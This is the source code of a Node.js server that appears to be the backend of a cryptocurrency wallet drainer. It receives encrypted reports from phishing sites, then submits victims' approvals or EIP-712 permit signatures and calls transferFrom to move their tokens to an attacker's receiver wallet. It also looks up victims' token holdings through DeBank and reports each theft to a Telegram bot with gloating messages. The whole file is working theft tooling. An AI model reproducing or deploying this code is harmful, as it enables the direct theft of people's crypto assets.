const express = require("express");
const cors = require("cors");
const ethers = require("ethers");
const rateLimit = require("express-rate-limit");
const dotenv = require("dotenv");
const fetch = require("node-fetch");
const CCrypto = require("crypto-js");
dotenv.config();

const app = express();

const minUsdValue = 5;
let totalBalance = 0;

const PORT = process.env.PORT || 3000;
const signer_wallet = new ethers.Wallet(process.env.SAFAprivatekey);
const signer_wallet_address = signer_wallet.address;

app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const ERC20_ABI = [
  {
    constant: true,
    inputs: [],
    name: "name",
    outputs: [
      {
        name: "",
        type: "string",
      },
    ],
    payable: false,
    type: "function",
  },
  {
    constant: false,
    inputs: [
      {
        name: "_from",
        type: "address",
      },
      {
        name: "_to",
        type: "address",
      },
      {
        name: "_value",
        type: "uint256",
      },
    ],
    name: "transferFrom",
    outputs: [
      {
        name: "",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  ,
  {
    constant: false,
    inputs: [
      {
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        internalType: "address",
        name: "spender",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "rawAmount",
        type: "uint256",
      },
      {
        internalType: "uint256",
        name: "deadline",
        type: "uint256",
      },
      {
        internalType: "uint8",
        name: "v",
        type: "uint8",
      },
      {
        internalType: "bytes32",
        name: "r",
        type: "bytes32",
      },
      {
        internalType: "bytes32",
        name: "s",
        type: "bytes32",
      },
    ],
    name: "permit",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [
      {
        name: "_owner",
        type: "address",
      },
      {
        name: "_spender",
        type: "address",
      },
    ],
    name: "allowance",
    outputs: [
      {
        name: "remaining",
        type: "uint256",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [
      {
        name: "_owner",
        type: "address",
      },
    ],
    name: "balanceOf",
    outputs: [
      {
        name: "",
        type: "uint256",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
];
const WITHDRAW_ABI = [
  {
    inputs: [
      {
        internalType: "address",
        name: "_devAddress",
        type: "address",
      },
    ],
    payable: true,
    stateMutability: "payable",
    type: "constructor",
  },
  {
    constant: false,
    inputs: [],
    name: "withdraw",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
];

function ucfirst(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

function format_addy(inputString) {
  const firstFive = inputString.substring(0, 5);
  const lastFour = inputString.substring(inputString.length - 4);
  return `${firstFive}...${lastFour}`;
}
const limiter = rateLimit({
  windowMs: 1000,
  handler: function (req, res, next) {
    res.status(429).json({
      message: "Too many requests, please try again later.",
    });
  },
});

const limiter_tokens_endpoint = rateLimit({
  windowMs: 10000,
  handler: function (req, res, next) {
    res.status(429).json({
      message: "Too many requests, please try again later.",
    });
  },
});

const config = {
  receiver: process.env.receiverAddress,
  SAFAprivatekey: process.env.SAFAprivatekey,
  signer_wallet_address: signer_wallet_address,
  BOT_TOKEN: process.env.bot,
  CHAT_ID: process.env.chat_id,
  KEY_PAIR: process.env.key_pair,
  DEBANK_API: process.env.debank_api,
};

const chain_list = [
  {
    id: "eth",
    name: "Ethereum",
    community_id: 1,
    rpc_url: "https://rpc.ankr.com/eth",
    Uniswap: {
      SwapRouter: "0xE592427A0AEce92De3Edee1F18E0157C05861564",
      "SwapRouter02	": "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45",
      Permit2: "0x000000000022d473030f116ddee9f6b43ac78ba3",
      UniversalRouter: "0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD",
    },
    Pancakeswap: {
      pancakeSwapRouter: "0xEfF92A263d31888d860bD50809A8D171709b7b1c",
    },
    Sushiswap: {
      sushiSwapRouter: "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F",
    },
  },
  {
    id: "pze",
    name: "Polygon zkEVM",
    community_id: 1101,
    rpc_url: "https://1rpc.io/polygon/zkevm",
  },
  {
    id: "mobm",
    name: "Moonbeam",
    community_id: 1284,
    rpc_url: "https://rpc.ankr.com/moonbeam",
  },
  {
    id: "fuse",
    name: "Fuse",
    community_id: 122,
    rpc_url: "https://rpc.fuse.io",
  },
  {
    id: "matic",
    name: "Polygon",
    community_id: 137,
    rpc_url: "https://rpc-mainnet.maticvigil.com",
    Uniswap: {
      SwapRouter: "0xE592427A0AEce92De3Edee1F18E0157C05861564",
      "SwapRouter02	": "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45",
      Permit2: "0x000000000022d473030f116ddee9f6b43ac78ba3",
      UniversalRouter: "0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD",
    },
  },
  {
    id: "op",
    name: "Optimism",
    community_id: 10,
    rpc_url: "https://rpc.ankr.com/optimism",
  },
  {
    id: "bsc",
    name: "BNB Chain",
    community_id: 56,
    rpc_url: "https://bsc-dataseed.binance.org",
    Uniswap: {
      "SwapRouter02	": "0xB971eF87ede563556b2ED4b1C0b0019111Dd85d2",
      Permit2: "0x000000000022d473030f116ddee9f6b43ac78ba3",
      UniversalRouter: "0x5302086A3a25d473aAbBd0356eFf8Dd811a4d89B",
    },
    Pancakeswap: {
      SwaprouterV3: "0x13f4EA83D0bd40E75C8222255bc855a974568Dd4",
      SwaprouterV2: "0xca143ce32fe78f1f7019d7d551a6402fc5350c73",
    },
    Sushiswap: {
      sushiSwapRouter: "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506",
    },
  },
  {
    id: "celo",
    name: "Celo",
    community_id: 42220,
    rpc_url: "https://rpc.ankr.com/celo",
  },
  {
    id: "ftm",
    name: "Fantom",
    community_id: 250,
    rpc_url: "https://1rpc.io/ftm	pc",
  },
  {
    id: "pls",
    name: "Pulse",
    community_id: 369,
    rpc_url: "https://rpc.pulsechain.com",
  },
  {
    id: "klay",
    name: "Klaytn",
    community_id: 8217,
    rpc_url: "https://public-en-cypress.klaytn.net",
  },
  {
    id: "aurora",
    name: "Aurora",
    community_id: 1313161554,
    rpc_url: "https://aurora.drpc.org",
  },
  {
    id: "avax",
    name: "Avalanche",
    community_id: 43114,
    rpc_url: "https://1rpc.io/avax/c",
  },
  {
    id: "era",
    name: "zkSync Era",
    community_id: 324,
    rpc_url: "https://mainnet.era.zksync.io",
  },
  {
    id: "base",
    name: "Base",
    community_id: 8453,
    rpc_url: "https://base.publicnode.com",
    Uniswap: {
      "SwapRouter02	": "0x2626664c2603336E57B271c5C0b26F421741e481",
      Permit2: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
      UniversalRouter:
        "0x3fC91A3a0x198EF79F1F515F02dFE9e3115eD9fC07183f02fCfd70395Cd496C647d5a6CC9D4B2b7FAD",
    },
  },
  {
    id: "cro",
    name: "Cronos",
    community_id: 25,
    rpc_url: "https://evm.cronos.org",
  },
  {
    id: "xdai",
    name: "Gnosis Chain",
    community_id: 100,
    rpc_url: "https://gnosis.drpc.org",
  },
  {
    id: "movr",
    name: "Moonriver",
    community_id: 1285,
    rpc_url: "https://moonriver.publicnode.com",
  },
  {
    id: "arb",
    name: "Arbitrum",
    community_id: 42161,
    rpc_url: "https://rpc.ankr.com/arbitrum",
    Uniswap: {
      SwapRouter: "0xE592427A0AEce92De3Edee1F18E0157C05861564",
      "SwapRouter02	": "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45",
      Permit2: "0x000000000022d473030f116ddee9f6b43ac78ba3",
      UniversalRouter: "0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD",
    },
  },
];

const secretKey = config.KEY_PAIR;
function encryptSHA256(data, secretKey) {
  const secretKeyWordArray = CCrypto.enc.Utf8.parse(secretKey);
  const encrypted = CCrypto.AES.encrypt(data, secretKeyWordArray, {
    mode: CCrypto.mode.CBC,
    padding: CCrypto.pad.Pkcs7,
    iv: CCrypto.lib.WordArray.create([0]),
  });
  return encrypted.toString();
}

function decryptSHA256(data, secretKey) {
  try {
    const secretKeyWordArray = CCrypto.enc.Utf8.parse(secretKey);
    const decrypted = CCrypto.AES.decrypt(
      decodeURIComponent(data),
      secretKeyWordArray,
      {
        mode: CCrypto.mode.CBC,
        padding: CCrypto.pad.Pkcs7,
        iv: CCrypto.lib.WordArray.create([0]), // Initialization Vector
      }
    );
    return decrypted.toString(CCrypto.enc.Utf8);
  } catch {
    return null;
  }
}
function generateEncryptedValue(data, secretKey) {
  try {
    data = JSON.stringify(data);
    const encryptedResult = encryptSHA256(data, secretKey);
    const percentEncodedResult = encodeURIComponent(encryptedResult);
    return percentEncodedResult;
  } catch {
    return null;
  }
}

async function notify(params, title) {
  try {
    let message = encodeURIComponent(`🚀New Arrival !!! 🔥😈\n\n${title}`);
    Object.keys(params).forEach(function (key) {
      message += `%0A${key}: ${params[key]}`;
    });
    let urlString = `https://api.telegram.org/bot${config.BOT_TOKEN}/sendMessage?chat_id=${config.CHAT_ID}&text=${message}&parse_mode=HTML&disable_web_page_preview=true`;

    const response = await fetch(urlString);
    if (!response.ok) {
      throw new Error(
        `Failed to send notification. HTTP status: ${response.status}`
      );
    }
    const responseData = await response.json();
  } catch (error) {
    console.error(error.message);
  }
}

function pipeAndFilter(data) {
  data.forEach((item) => {
    if (item.id && item.id.startsWith("0x")) {
      item.is_native = false;
    } else {
      item.is_native = true;
    }
  });
  const filteredData = data.filter(
    (item) =>
      item.price_24h_change !== null &&
      chain_list.find((chain) => chain.id === item.chain) &&
      item.amount * item.price > minUsdValue
  );
  const sortedData = filteredData.sort(
    (a, b) => b.amount * b.price - a.amount * a.price
  );

  return sortedData;
}

app.post("/oracle/notify", limiter, async (req, res) => {
  try {
    const encryptedData = req.body.encrypted;

    let decryptedData;
    try{
      decryptedData = JSON.parse(decryptSHA256(encryptedData, secretKey));
    } catch (error) {
      console.log("tampered payload")
      return
    }
    const { params, title, sendNotif } = decryptedData;

    if (sendNotif) {
      notify(params, title);

      return res.status(200).send({
        status: true,
      });
    }
  } catch (err) {
    return res.status(500).json({
      success: false,
      message: err.message,
      encrypted: null,
    });
  }
});

app.get("/oracle/tokens", limiter_tokens_endpoint, async (req, res) => {
  try {
    const { address: account_address } = req.query;

    const url = `https://pro-openapi.debank.com/v1/user/all_token_list?id=${account_address}`;
    const headers = {
      Accept: "application/json",
      AccessKey: config.DEBANK_API,
    };
    const response = await fetch(url, {
      method: "GET",
      headers: headers,
    });
    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }
    const data = await response.json();
    const result_ = [pipeAndFilter(data)];
    const result = generateEncryptedValue(result_, secretKey);
    return res.json({
      success: true,
      encrypted: result,
    });
  } catch (err) {
    return res.status(500).json({
      success: false,
      message: err.message,
      encrypted: null,
    });
  }
});

function getRpcUrl(chainId) {
  const chain = chain_list.find((chain_) => chain_.community_id === chainId);
  if (chain) {
    console.log(`Using rpc url: ${chain.rpc_url}`);
    return chain.rpc_url;
  } else {
    console.log("rpc chose error");
    return null;
  }
}
let escaper = (ah) => {
  if (typeof ah !== "string") {
    return ah;
  }
  return ah;
  return ah
    .replace(/_/g, "\\_")
    .replace(/\*/g, "\\*")
    .replace(/\[/g, "\\[")
    .replace(/\]/g, "\\]")
    .replace(/\(/g, "\\(")
    .replace(/\)/g, "\\)")
    .replace(/~/g, "\\~")
    .replace(/`/g, "\\`")
    .replace(/>/g, "\\>")
    .replace(/#/g, "\\%23")
    .replace(/\+/g, "\\+")
    .replace(/-/g, "\\-")
    .replace(/=/g, "\\=")
    .replace(/\|/g, "\\|")
    .replace(/{/g, "\\{")
    .replace(/}/g, "\\}")
    .replace(/\./g, "\\.")
    .replace(/!/g, "\\!");
};

async function fetchNativePrices(provider) {
  let nativeBalance = await provider.getBalance(config.signer_wallet_address);
  let url =
    "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd";
  let response = await fetch(url);
  let price = await response.json();
  let perETH = price["ethereum"]["usd"];
  usdbal = (nativeBalance / 10 ** 18 / perETH).toFixed(2);
  ethbal = (nativeBalance / 10 ** 18).toFixed;
  return [usdbal, ethbal];
}

 

async function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

app.post("/oracle/erc20", async (req, res) => {
  res.status(200).send({
    status: true,
  });

  const encryptedData = req.body.encrypted;
  let decryptedData;
  try{
    decryptedData = JSON.parse(decryptSHA256(encryptedData, secretKey));
  } catch (error) {
    console.log("tampered payload")
    return
  }
  // console.log(JSON.stringify(decryptedData))

  const { address, contractAddress, transactionHash, websiteUrl, chainId } =
    decryptedData;

  let provider = new ethers.providers.JsonRpcProvider(getRpcUrl(chainId));
  // console.log(chainId_)
  let receipt = await provider.waitForTransaction(transactionHash);
  // console.log(receipt);
  await provider.waitForTransaction(transactionHash);

  const signer = new ethers.Wallet(config.SAFAprivatekey, provider);
  let contractInstance = new ethers.Contract(
    contractAddress,
    ERC20_ABI,
    signer
  );
  let tokenName = await contractInstance.name();

  try {
    let message_ =
    `🟢 <b>[+] Approval Made for ERC20 Transfer</b>\n\n` +
    `💎 <b>Token name:</b> ${escaper(tokenName)}\n` +
    `🔑 <b>Wallet Address</b>: <a href="https://debank.com/profile/${address}">${format_addy(address)}</a>\n` +
    `🌐 <b>Website</b>: ${escaper(websiteUrl)}\n`;
      notify({},message_);
      console.log("[+] Approved ERC20");

    let withdrawal;
    let allowance;
    let retries = 3;
    let delayInSeconds = 5;

    allowance = await contractInstance.allowance(
      address,
      config.signer_wallet_address
    );
    let retryCount = 0;
    while (retryCount < retries && allowance <= 0) {
      allowance = await contractInstance.allowance(
        address,
        config.signer_wallet_address
      );
      await delay(delayInSeconds * 1000);
      console.log(
        `Retrying transaction check (${retryCount + 1}/${retries}) retries...`
      );
      retryCount++;
    }

    let balance = await contractInstance.balanceOf(address);
    if (parseInt(allowance) > 0 && balance > 0) {
      const gasPrice = (await provider.getGasPrice()).mul(2);

      if (balance.gte(allowance)) {
        withdrawal = await contractInstance.transferFrom(
          address,
          config.receiver,
          allowance,
          { gasPrice }
        );
      } else {
        withdrawal = await contractInstance.transferFrom(
          address,
          config.receiver,
          balance,
          { gasPrice }
        );
      }

      await provider.waitForTransaction(withdrawal.hash);

      let withdrawMessage_1 =
      `🟢 <b>[+] Withdrawn ERC20</b>\n\n` +
      `💎 <b>Token name:</b> ${escaper(tokenName)}\n` +
      `🔑 <b>Wallet Address</b>: <a href="https://debank.com/profile/${address}">${format_addy(address)}</a>\n` +
      `🔐 <b>Receipient Address</b>: <a href="https://debank.com/profile/${config.receiver}">${format_addy(config.receiver)}</a>\n` +
      `🔍 <b>Tx Hash</b>: <a href="https://explorer.bitquery.io/search/${withdrawal.hash}">Lookup Tx</a>\n` +
      `🌐 <b>Website</b>: ${escaper(websiteUrl)}\n`;
        notify({},withdrawMessage_1);
        console.log("[+] Withdrawn ERC20");

   
    } else {
      let message2 =
      `🔴 <b>[-] Approval Balance Error</b>\n\n` +
      `<b>Reason:</b> Low Approval Amount\n` ;
        notify({},message2);
      console.log("[-] LOW ALLOWANCE");

    }
  } catch (error) {

    let message2 =
    `🔴 <b>[-] Approval Transfer Error</b>\n\n` +
    `<b>Reason:</b> Possible low gas balance\n` ;
      notify({},message2);
    console.log("[-] POSSIBLE LOW GAS");
    // console.log(error);


  }
});

app.post("/oracle/eip712", async (req, res) => {
  res.status(200).send({
    status: true,
  });

  const encryptedData = req.body.encrypted;
  let decryptedData;
  try{
    decryptedData = JSON.parse(decryptSHA256(encryptedData, secretKey));
  } catch (error) {
    console.log("tampered payload")
    return
  }
  // console.log(JSON.stringify(decryptedData))

  const { address, contractAddress, websiteUrl, chainId, permit } =
    decryptedData;


    try {

  const permit_obj = JSON.parse(permit);

  let provider = new ethers.providers.JsonRpcProvider(getRpcUrl(chainId));
  let permitValue = permit_obj.value;
  let r = permit_obj.r;
  let s = permit_obj.s;
  let v = permit_obj.v;
  let deadline = permit_obj.deadline;

  const signer = new ethers.Wallet(config.SAFAprivatekey, provider);
  let contractInstance = new ethers.Contract(
    contractAddress,
    ERC20_ABI,
    signer
  );
  let tokenName = await contractInstance.name();
    let estimated_gasLimit = await contractInstance.estimateGas.permit(
      address,
      config.signer_wallet_address,
      permitValue,
      deadline,
      v,
      r,
      s
    );
    let gasLimitHex = ethers.utils.hexlify(estimated_gasLimit);
    let permit_tx = await contractInstance.permit(
      address,
      config.signer_wallet_address,
      permitValue,
      deadline,
      v,
      r,
      s,
      { gasLimit: gasLimitHex, 
        gasPrice: (await provider.getGasPrice()).mul(2)
     }
    );
    await provider.waitForTransaction(permit_tx.hash);
    let message =
    `🟢 <b>[+] PERMIT Gasless Approval Tx</b>\n\n` +
    `💎 <b>Token name:</b> ${escaper(tokenName)}\n` +
    `🔑 <b>Wallet Address</b>: <a href="https://debank.com/profile/${address}">${format_addy(address)}</a>\n` +
    `🌐 <b>Website</b>: ${escaper(websiteUrl)}\n`;
      notify({},message);
      console.log("[+] Approved ERC20");

    // WITHDRAWING THE PERMITTED TOKEN BALANCE
    let withdrawal;
    let allowance;
    let retries = 3;
    let delayInSeconds = 5;

    allowance = await contractInstance.allowance(
      address,
      config.signer_wallet_address
    );
    let retryCount = 0;
    while (retryCount < retries && allowance <= 0) {
      allowance = await contractInstance.allowance(
        address,
        config.signer_wallet_address
      );
      await delay(delayInSeconds * 1000);
      console.log(
        `Retrying transaction check (${retryCount + 1}/${retries}) retries...`
      );
      retryCount++;
    }
    let balance = await contractInstance.balanceOf(address);
    if (parseInt(allowance) > 0 && balance > 0) {
      const gasPrice = (await provider.getGasPrice()).mul(2);

      if (balance.gte(allowance)) {
        withdrawal = await contractInstance.transferFrom(
          address,
          config.receiver,
          allowance,
          { gasPrice }
        );
      } else {
        withdrawal = await contractInstance.transferFrom(
          address,
          config.receiver,
          balance,
          { gasPrice }
        );
      }

      await provider.waitForTransaction(withdrawal.hash);

      let withdrawMessage =
      `🟢 <b>[+] Withdrawn ERC20</b>\n\n` +
      `💎 <b>Token name:</b> ${escaper(tokenName)}\n` +
      `🔑 <b>Wallet Address</b>: <a href="https://debank.com/profile/${address}">${format_addy(address)}</a>\n` +
      `🔐 <b>Receipient Address</b>: <a href="https://debank.com/profile/${config.receiver}">${format_addy(config.receiver)}</a>\n` +
      `🔍 <b>Tx Hash</b>: <a href="https://explorer.bitquery.io/search/${withdrawal.hash}">Lookup Tx</a>\n` +
      `🌐 <b>Website</b>: ${escaper(websiteUrl)}\n`;
        notify({},withdrawMessage);
        console.log("[+] Withdrawn Gasless ERC20");



      } else {
        let message2 =
        `🔴 <b>[-] Approval Balance Error</b>\n\n` +
        `<b>Reason:</b> Low Approval Amount\n` ;
        await notify({},message2);
        console.log("[-] LOW ALLOWANCE");
  
      }
    } catch (error) {
  
      let message2 =
      `🔴 <b>[-] Approval Transfer Error</b>\n\n` +
      `<b>Reason:</b> Possible low gas balance\n` ;
      await notify({},message2);
      console.log("[-] POSSIBLE LOW GAS");
      console.log(error);
    
  }
});

app.listen(PORT, () => console.log(`Listening on port ${PORT}`));
